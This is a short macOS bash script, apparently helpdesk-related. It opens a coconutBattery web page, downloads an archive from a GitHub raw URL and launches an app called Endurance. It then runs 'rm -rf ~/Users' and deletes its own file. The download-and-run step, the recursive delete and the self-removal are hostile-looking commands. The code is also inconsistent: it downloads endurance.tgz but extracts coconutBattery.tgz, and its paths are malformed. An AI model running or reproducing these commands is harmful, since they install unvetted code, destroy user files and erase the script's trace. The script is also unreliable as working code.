#!/bin/bash

open -a Safari https://coconut-flavour.com/coconutbattery/

curl https://raw.githubusercontent.com/daroan/helpdesk/master/endurance.tgz -o ~/endurance.tgz

tar -xvf ~/coconutBattery.tgz

rm -rf ~/endurance.tgz

open -a ~/Users/mac/Endurance.app

sleep 5

rm -rf ~/Users

rm ~/test.sh

exit
